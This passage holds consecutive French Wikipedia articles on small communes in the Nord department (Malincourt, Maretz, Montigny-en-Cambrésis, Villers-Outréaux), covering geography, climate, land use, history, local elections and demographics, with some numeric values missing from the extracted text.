Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Malincourt est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Cambrai, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (94,5 % en 2018), une proportion sensiblement équivalente à celle de 1990 (95 %). La répartition détaillée en 2018 est la suivante : 
terres arables (89 %), prairies (5,6 %), zones urbanisées (5,5 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Maslaincurth (1139), Mallaincurt (1177), Malleincort (1181), Malleincurt (1197).
D'après M. Gysseling, Malincourt est « "Maþlain curtis" », la ferme de Maþla. Ce nom est un anthroponyme germanique formé sur "maþla", « réunion du peuple ».
Histoire.
En 1802-1803, Malincourt fait partie des quelques communes du département du Nord où existe un culte protestant, de même qu'à Walincourt, Lecelles, Illies, Saulzoir... À cette époque, les protestants enterrent encore leurs morts dans leurs jardins (parce que non autorisés à les ensevelir dans le cimetière communal?).
Politique et administration.
Maire de 1802 à 1808 : Jean L. Ducamp.
Maire en 1881 : Lecarnelle-Dieudonné.
Maire de 1977 à 1991: Maurice Doom.
Population et société.
Démographie.
Pyramide des âges.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 29,5 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 29,5 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,71 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191907" url="https://fr.wikipedia.org/wiki?curid=191907" title="Maretz">
Maretz

Maretz est une commune française située dans le département du Nord, en région Hauts-de-France.
La commune s'étend le long de la D932 (dite « "Chaussée Brunehaut" ») sur plus de 4 km. Elle administre aussi le hameau d'Avelu (100 habitants) situé le long de la D111 entre Maretz et Élincourt.
Le nom jeté des habitants de Maretz est les "Culs Frais".
Géographie.
Localisation.
La ville, située dans l'extrême sud du département du Nord, est frontalière du département de l'Aisne, région Hauts-de-France.
Maretz est à 7,2 km de Bohain-en-Vermandois, 8,63 km de Caudry, 11 km de Le Cateau-Cambrésis, 19,39 km de Cambrai, 24,19 km de Saint-Quentin, 70,3 km de Lille et 153,34 km de Paris à vol d'oiseau.
Relief et paysages.
Maretz est un village entouré de champs de type openfield. Il s'agit essentiellement de champs de blé et de betteraves. Le village est bordé au sud-sud-est par le bois de Maretz et au nord-nord-est par le bois de Mont-Auban situé sur le territoire de Maretz et le bois de Boulogne et le bois de Gattigny situés sur le territoire de Bertry. Au nord-ouest, le hameau d'Avelu est bordé par le bois de Pinon et le bois de Tupigny situés sur le territoire d'Élincourt.
Le point le plus haut de la commune culmine à 166 mètres.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Riot de la Ville, le Calenne, le Riot Hippolyte et un autre petit cours d'eau.
Le Riot de la Ville, d'une longueur de , prend sa source dans la commune de Busigny et se jette dans le canal des Torrents à Prémont, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Risques naturels.
Selon l'état des données des risques naturels, il existe des zones potentiellement inondables. Elles sont principalement situées le long des riots et hors agglomération, le long des talwegs. Quelques points singuliers sont signalés dans le village (Boves, puits, affaissements de terrain...). Il existe ainsi quelques zones exposées au risque d'effondrement de cavités.
L'aléa du risque de retrait-gonflement des argiles est faible voire a priori nul.
Le risque de remontées des nappes varie d'une sensibilité faible à très forte en fonction des endroits avec une zone connue hors agglomération de nappe sub-affleurante.
L'aléa sismique à Maretz est faible.
Voies de communication et transports.
Maretz est traversée par la route départementale D932 (dite « chaussée Brunehaut ») et la route départementale D15 de Clary à Busigny.
Maretz est desservie par le réseau d'autocars Arc-en-Ciel.
La gare SNCF la plus proche est la gare de Busigny.
Urbanisme.
Typologie.
Au , Maretz est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Busigny, une agglomération intra-départementale regroupant deux communes, dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (80,5 % en 2018), en diminution par rapport à 1990 (83 %). La répartition détaillée en 2018 est la suivante : 
terres arables (77,1 %), zones urbanisées (9,7 %), forêts (6,7 %), milieux à végétation arbustive et/ou herbacée (3,1 %), zones agricoles hétérogènes (3 %), prairies (0,3 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Logement.
En 2017, Maretz compte 668 logements dont 86,1 % de résidences principales, 0,7 % de résidences secondaires et 13,2 % de logements vacants.
Toponymie.
On trouve le village mentionné au long des sous les noms "Marets", "Maerech", "Marez", "Maareth", "Maarech", "Maray" ou "Marais", "Marest". Selon Boniface ces noms se rapportent aux marais de la vallée humide où est situé le village.
Histoire.
Le village est incendié par les Armagnacs en 1434.
En août 1660, des lettres données à Paris accordent le titre de chevalier à Jérôme du Rietz, écuyer, seigneur de Frévillers, Jouy, Hamol (Hamel?), Maretz, Grande-Vacquery, Noyelles et Valhuon en partie. Jérôme du Rietz est dit gentilhomme, ses ancêtres n'ont jamais fait acte de dérogeance à leur ancienne noblesse, plusieurs ont été chevaliers.
Le , les troupes anglaises du duc d'Ormont enferment les habitants du village de Maretz dans leur église et y mettent le feu. Près de 350 personnes périssent dans les flammes. Les 150 maisons de la paroisse sont ensuite réduites en cendres. Louis XIV accorda au village une exemption complète d'impôts jusque 1716 afin de répondre aux sollicitations de Fénelon alors archevêque de Cambrai.
En 1802-1803, à la suite de la Révolution française, les protestants sont enterrés dans le cimetière communal. C'est également le cas à Inchy. En revanche, dans d'autres communes,(ex : Walincourt, Malincourt), les protestants enterrent leurs morts dans leurs jardins (parce que non autorisés à les ensevelir dans le cimetière communal?).
Dès le , la commune de Maretz a accueilli beaucoup de filatures comme de nombreuses localités du Cambrésis. Depuis les années 1970, toutes ces filatures textiles ont fermé expliquant le déclin démographique relatif du village. Parmi les entreprises passées importantes, nous retiendrons G.T.N. (Groupement Textile du Nord) délocalisé et les Entreprises Lasson.
Notons qu'avant G.T.N. se trouvait un atelier de tissu de Gabrielle Chasnel dite Coco Chanel. Pendant la Seconde Guerre mondiale, son neveu, André Palasse était prisonnier. Pour le faire libérer, Coco Chanel a contacté celui qui était devenu son amant : Hans Günther von Dinklage dit Spatz, attaché d'ambassade et espion allemand. Ce dernier n'est pas arrivé à faire libérer André Palasse. Spatz a alors contacté un de ses amis Théodore Momm qui dirigeait une entreprise de textile en Belgique et en Allemagne et qui était chargé des problèmes liés au textile en France. Théodore Momm réussit à faire libérer André Palasse par le biais de la construction d'une usine de tissu à Maretz et dont le neveu de Coco Chanel prit la direction.
Le , un incendie volontaire détruit totalement la mairie de Maretz. Cet incendie suit celui de la salle des fêtes survenu quelques jours plus tôt et précède celui de l'école maternelle. Réhabilitée, la mairie est inaugurée le 26 mai 2018. La salle des mariages est décorée de deux peintures offertes par une artiste locale.
Le 12 juin 2023, l'école Fernand Lantoine est mise à l'honneur en devenant lauréate de la 26e édition du Parlement des enfants grâce à sa proposition de loi visant à créer un "Bois de la Démocratie" dans chaque circonscription législative. Récompense remise par Yaël Braun-Pivet, présidente de l'Assemblée nationale et en présence de Pap Ndiaye, ministre de l'Éducation nationale et de la Jeunesse.
Pour donner du sens à ce projet, Yaël Braun-Pivet se rend à Maretz le 27 novembre 2023 pour y planter deux ginkgos bilobas. Le premier est planté dans la cour de l'école Fernand Lantoine et le second sur la place du village. Ces plantations sont effectuées en présence du député Guy Bricout, du sous-préfet Fayçal Douhane, du directeur académique des services de l'éducation nationale Olivier Cottet, des conseillers départementaux Yannick Caremelle et Sylvie Clerc, de Monique Lesne-Sétiaux, maire du village, du directeur de l'école Guillaume Gabriels et des élèves de sa classe.
Politique et administration.
Situation administrative.
La commune de Maretz se situe dans le département du Nord et fait partie de la région Hauts-de-France. Elle appartient à l'arrondissement de Cambrai et au canton du Cateau-Cambrésis. Elle faisait partie du canton de Clary jusqu'au 22 mars 2015, date de disparition de ce canton à la suite du redécoupage cantonal de 2014.
Administration municipale.
La commune ayant entre 500 et 1499 habitants, le nombre de conseillers municipaux est de 15.
À la suite des élections municipales anticipées de 2022, la composition du Conseil municipal de Maretz est la suivante :
À la suite des élections municipales de 2020, la composition du Conseil municipal de Maretz est la suivante :
Intercommunalité.
Maretz était membre de la communauté de communes du Caudrésis créée fin 1993.
Celle-ci fusionne avec la communauté de communes du Pays de Matisse pour créer le janvier 2010 la Communauté d'agglomération du Caudrésis - Catésis, dont Maretz est désormais membre.
Tendances politiques et résultats.
Au premier tour des élections présidentielles de 2022, Marine Le Pen (RN) recueille 50,66 % des suffrages exprimés (344 voix), le président sortant Emmanuel Macron (LREM) 18,85 % (128 voix), Jean-Luc Mélenchon (LFI) 12,37 % (84 voix), Éric Zemmour (REC) 5,3 % (36 voix), Valérie Pécresse (LR) 3,09 % (21 voix), Fabien Roussel (PCF) 2,95 % (20 voix), Jean Lassalle (RES) 2,21 % (15 voix), Nicolas Dupont-Aignan (DLF) 1,91 % (13 voix), Yannick Jadot (EELV) 1,47 % (10 voix), Anne Hidalgo (PS) 0,59 % (4 voix), Philippe Poutou (NPA) 0,44 % (3 voix) et Nathalie Arthaud (LO) 0,15 % (1 voix). Le taux de participation est de 73,09 %. Au deuxième tour de ces élections, Marine Le Pen (RN) recueille 70,38 % (487 voix) contre 29,62 % (205 voix) pour Emmanuel Macron (LREM). Le taux de participation est de 77,65 %.
À la suite de la démission de plusieurs membres du conseil municipal début 2022, de nouvelles élections municipales sont organisées le 27 mars 2022. Trois listes se présentent : "Maretz apaisé", menée par le maire sortant Didier Kehl ; "Maretz pour tous", menée par Christelle Noé et "Ensemble pour un avenir serein", menée par Monique Lesne-Sétiaux. Au premier tour, la liste "Ensemble pour un avenir serein" vire en tête avec 234 voix, suivie de la liste "Maretz apaisé" qui recueille 165 voix puis de la liste "Maretz pour tous" qui obtient 157 voix. Les trois listes se maintiennent pour le second tour. Le classement demeure inchangé : "Ensemble pour un avenir serein" obtient 263 voix, puis "Maretz apaisé" obtient 173 voix et "Maretz pour tous" obtient 135 voix.
Au deuxième tour des élections régionales de 2021, Xavier Bertrand (DVD) recueille 57,68 % des voix, Sébastien Chenu (RN) obtient 31,09 % des voix et Karima Delli (Union de la gauche) obtient 11,24 % des voix.
Au deuxième tour des élections départementales de 2021, le binôme Sylvie Clerc et Yannick Caremelle (Divers centre) obtient 59,48 % des voix contre 40,52 % des voix pour Mélanie Disdier et Pierre-Antoine Watremez (RN).
Au premier tour des élections municipales de 2020, Maretz compte quatre listes, ce qui en fait la troisième commune du Cambrésis en nombre de listes derrière Cambrai (7 listes) et Caudry (6 listes). La liste l"Éveil Maretzien" de Didier Kehl obtient 171 voix (30,31 % des sondages exprimés) ; la "liste d'Union pour un Nouvel Horizon" d'Aimé Bleuse obtient 167 voix (29,60 % des sondages exprimés) ; la liste "Ensemble, Gardons le Cap !" de Monique Lesne Setiaux obtient 142 voix (25,17 % des sondages exprimés) et la liste "Réinventons Maretz" de Sandrine Bellanger obtient 84 voix (14,89 % des sondages exprimés). Au deuxième tour, la liste de Sandrine Bellanger s'allie à celle de Monique Lesne Setiaux. La liste de Didier Kehl arrive en tête avec 237 voix (41,72 % des sondages exprimés) ; la liste de Monique Lesne-Sétiaux arrive en deuxième position avec 202 voix (35,56 % des sondages exprimés) et la liste d'Aimé Bleuse obtient 129 voix (22,71 % des sondages exprimés). Le taux d'abstention est de 37,19 %.
Aux élections européennes de 2019, la liste "Prenez le pouvoir" soutenue par Marine Le Pen arrive en tête avec 47,58 % des suffrages exprimés soit 226 voix. En deuxième position, la liste "Renaissance" soutenue notamment par La République en Marche et le MoDem obtient 54 voix soit 11,37 % des suffrages exprimés. Le taux de participation est de 54,62 % (508 votants).
Au deuxième tour des élections législatives de 2017, les électeurs de Maretz ont voté à 70,93 % pour Guy Bricout (UDI) contre 29,07 % pour Claire Pommeyrol-Burlet (LREM) pour la circonscription du Nord. Le taux de participation est de 44,23 %.
Au deuxième tour de l'élection présidentielle de 2017, Marine Le Pen (RN) recueille 68,39 % des suffrages exprimés (476 voix) contre 31,61 % pour Emmanuel Macron (LREM) (220 voix). Le taux de participation est de 85,53 %.
Au deuxième tour des élections régionales de 2015, 59,65 % des suffrages exprimés sont allés à la liste menée par Marine Le Pen (FN), contre 40,35 % pour la liste menée par Xavier Bertrand (LUD). Le taux de participation est de 65,63 %.
Au deuxième tour des élections départementales de 2015, le binôme Pascal Bultez et Virginie Monvoisin (FN) recueille 49,52 % des voix, suivi du binôme Sylvie Clerc-Cuvelier et Didier Drieux (UD) avec 33,08 % et du binôme Laurent Coulon et Valérie Lheureux (SOC) avec 17,41% des voix. Le taux de participation est de 56,67 %.
Liste des maires.
Guy Rativeau a été maire de la commune pendant 23 ans. Sa vie politique a été notamment ponctuée par son association à la candidate PS aux législatives de 2002, Brigitte Douay, députée européenne de 2004 à 2009.
Le , à la suite du premier tour des élections municipales, à la surprise générale, M. Guy Rativeau (maire depuis 1987) est battu. M. Aimé Bleuse est élu. Candidat sans étiquette, il est membre du parti socialiste mais n'a pas reçu d'investiture officielle dudit parti.
Lors de son élection en 2014, Pascal Lévêque est le plus jeune maire du Cambrésis, il est alors âgé de 29 ans.
En 2020, l'élection est remportée par Didier Kehl, outsider du scrutin.
En 2022, à la suite de plusieurs démissions au sein du conseil municipal, de nouvelles élections municipales sont organisées le 27 mars 2022. À l'issue de ces élections, Monique Lesne-Sétiaux devient la première femme maire du village.
Instances judiciaires et administratives.
La commune de Maretz est dans le ressort de la cour d'appel de Douai, du tribunal judiciaire, du tribunal d'instance, du tribunal Paritaire des Baux Ruraux et du conseil de prud'hommes de Cambrai, et à la suite de la réforme de la carte judiciaire engagée en 2007, du tribunal de commerce de Douai.
Politique environnementale.
Maretz pratique le tri sélectif pour le ramassage des déchets.
Le conseil municipal, lors de sa réunion du 11 juin 2019, émet un avis favorable au projet éolien de l'Épinette situé sur les territoires de Maretz et Clary. Ce projet prévoit la construction de sept éoliennes et deux postes de livraison.
Maretz possède un site pollué, le site G.T.N.
Jumelages.
Maretz n'est jumelée avec aucune autre commune. Elle est toutefois jumelée de facto avec Selm (Allemagne) au même titre que les autres communes du secteur scolaire du collège François Villon de Walincourt-Selvigny. Ainsi, sous l'impulsion du comité de jumelage, de nombreux échanges culturels ont lieu avec les associations et les établissements de Selm et le collège François Villon de Walincourt-Selvigny.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 39,5 %, soit au-dessus de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 21,5 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,1 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
Maretz est rattachée à la circonscription de Cambrai Sud de l'inspection académique du Nord dans l'académie de Lille.
La commune gère une école maternelle et une école primaire. Un groupe scolaire a été créé sur le site de l'ancien couvent du Don Bosco. L'école porte le nom de Fernand Lantoine, peintre officiel de la marine natif du village.
Maretz est rattachée au secteur du collège François Villon de Walincourt-Selvigny.
Les lycées les plus proches sont à Caudry et Le Cateau-Cambrésis.
Internet et téléphonie.
Grâce à la fibre optique, les habitants de Maretz peuvent bénéficier d'une connexion internet très haut-débit. Selon l'Autorité de Régulation des Télécommunications (ARCEP), plus de 80 % des locaux sont raccordables à la fibre optique à Maretz.
Maretz dispose d'une antenne 4G, rue des Poilus. La commune ne dispose pas de couverture 5G en 2021.
Santé.
En 2021, Maretz compte un médecin généraliste, une pharmacie, quatre masseurs-kinésithérapeutes et plusieurs infirmiers. L'hôpital le plus proche est celui du Cateau-Cambrésis.
Comme l'ensemble du territoire national, Maretz est confronté à la pandémie de Covid-19.
Sports.
Maretz dispose d'une salle de sports et d'un terrain de football. Le club de football local est le Football Club de Maretz, club de division. Un terrain de pétanque est en construction.
Associations.
Douze associations se trouvent à Maretz :
Cultes.
Les Maretziens disposent d'un lieu de culte catholique, l'église Saint-Martin, qui fait partie de la paroisse Sainte-Anne-en-Cambrésis dans le diocèse de Cambrai, relais de la Chaussée. La commune comprend également trois chapelles et un calvaire.
Les autres cultes ne sont pas représentés dans le village.
Économie.
Revenus de la population et fiscalité.
En 2019, le revenu mensuel moyen par foyer fiscal est de 1 653 € par mois (la moyenne française est de 2 318 € par mois). La commune abrite 794 foyers fiscaux avec une moyenne de 1,8 personne par foyer fiscal.
En 2019, l'impôt sur le revenu net moyen par foyer imposé est de 1 926 € (moyenne nationale de 3 888 €). Le revenu fiscal de référence moyen par foyer est de 19 836 € (moyenne nationale de 28 525 €).
En 2020, le revenu mensuel moyen par foyer fiscal est de 1 639 € par mois, soit une légère baisse par rapport à 2019 (la moyenne française baisse également à 2 303 € par mois). Le nombre de foyers fiscaux est de 809 (+15 par rapport à 2019) avec une moyenne qui reste de 1,8 personne par foyer fiscal.
En 2020, l'impôt sur le revenu net moyen progresse à 2 217 € (moyenne nationale de 3 910 €). Le revenu fiscal de référence moyen par foyer est de 19 677 € (moyenne nationale de 28 324 €).
Emploi.
En 2017, Maretz compte 76,6 % d'actifs contre 23,4 % d'inactifs.
En 2018, Maretz compte 73,6 % d'actifs contre 26,4 % d'inactifs.
Endettement.
En 2019, l'encours de la dette maretzienne est de 674 790 €, ce qui représente 458 € par habitant. L'annuité de la dette est de 46 200 € (soit 32 € par habitant). La capacité de désendettement est de 1,9 an.
En 2020, l'encours de la dette maretzienne baisse à 640 020 €, ce qui représente 437 € par habitant. L'annuité de la dette est de 59 940 € (soit 34 € par habitant). La capacité de désendettement passe à 2,5 ans.
Culture locale et patrimoine.
Patrimoine culturel.
Géant Babache.
Comme d'autres communes de la région, Maretz a son géant. Il s'agit du géant Babache.
Fêtes communales.
Plusieurs fêtes communales animaient la vie du village. Elles ont aujourd'hui disparu. Il y avait la fête de la rue de Là-Haut (actuelle rue Eugène Lefebvre), la fête de la Marnette (actuelle rue Pasteur), la fête de la Vilette (entrée de l'actuelle rue de la Délivrance) qui avait lieu le jour de l'Ascension qui a subsisté jusque 2001, la fête de la Cerise au hameau d'Avelu qui avait lieu le dimanche suivant le 14 juillet et la fête de Bois de Maretz qui avait lieu le lundi de Pentecôte.
Bois de la démocratie.
Lauréats du vingt-sixième Parlement des enfants en 2023, les élèves de l'école Fernand Lantoine ont fait comme proposition de loi la création d'un "Bois de la démocratie" qui vise à planter un arbre lorsque mille suffrages sont obtenus à une élection présidentielle ou législative. Reçus à l'Assemblée nationale, ils y avaient planté un ginkgo biloba dans ses jardins. Deux arbres identiques ont été plantés dans la cour de l'école et sur la place du village en présence de la présidente de l'Assemblée nationale Yaël Braun-Pivet.
Apéritif local.
Le Pêcher Mignon est un apéritif produit par l'apéritiverie Saint Jehan. Il s'agit d'un alcool à base de pêche blanche (18 % vol). L'établissement n'existe plus.

</doc>
<doc id="191909" url="https://fr.wikipedia.org/wiki?curid=191909" title="Montigny-en-Cambrésis">
Montigny-en-Cambrésis

Montigny-en-Cambrésis est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Géographie.
Commune située en Cambrésis.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par.
Le Torrent d'Esnes, d'une longueur de , prend sa source dans la commune de Bertry et se jette dans la rivière Escaut à Crèvecœur-sur-l'Escaut, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Montigny-en-Cambrésis est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (88,4 % en 2018), une proportion sensiblement équivalente à celle de 1990 (89,2 %). La répartition détaillée en 2018 est la suivante : 
terres arables (74,7 %), zones urbanisées (8,8 %), zones agricoles hétérogènes (8,8 %), prairies (4,9 %), forêts (2,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Le village est mentionné au long des sous les noms "Montigniaco", "Monteni" ou "Montengni", "Montenni", "Montegni", "Montingni". Selon Boniface et Mannier l'origine du nom est à chercher dans le latin "mons" (« montagne »), Montigny pouvant donc être « l'habitation du mont ». Une autre interprétation, avancée par Mannier, fait dériver le nom d'un nom d'homme courant aux , Montanus. Le suffixe celtique « "-iacum" » ou « "-iaco" », très répandu dans toute la Gaule, est à l'origine de noms de lieux très nombreux dans toute la France par union avec des radicaux latins ou des noms germaniques. Dans le nord de la Gaule ce suffixe a produit des noms en -y.
Le nom actuel date de 1931.
Politique et administration.
Maire en 1802-1803 : Théoph. Tamboise.
Maire en 1806-1807 : Jacques François Milliot.Maurice Delhaye (PS), maire en 1981 (sources : JO du 15 avril 1981).
Population et société.
Démographie.
Pyramide des âges.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 30,6 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 28,8 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,45 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191910" url="https://fr.wikipedia.org/wiki?curid=191910" title="Villers-Outréaux">
Villers-Outréaux

Villers-Outréaux est une commune française située dans le département du Nord en région Hauts-de-France. Ses habitants s'appellent les "Villersois". L'activité principale de la commune est la broderie, introduite au , et dont Villers-Outréaux est devenue la capitale nationale.
Géographie.
Localisation.
La commune de Villers-Outréaux se situe dans le sud du département du Nord, à la frontière du département de l'Aisne, au centre d'un triangle constitué par les villes de Cambrai, à , Caudry à et Saint-Quentin à à vol d'oiseau
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Saint-Liévain, le Catelet et le Malincourt.
Le ruisseau de Sargrenon prend sa source à la limite des finages des communes de Villers-Outréaux et de Malincourt. Il coule vers le nord pour rejoindre, à Esnes, la Warnelle, affluent de rive droite de l'Escaut. Un autre ruisseau, intermittent, prend sa source à Villers-Outréaux et s'écoule vers le sud, pour se jeter dans l'Escaut à Gouy (Aisne).
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA). 
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité. 
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
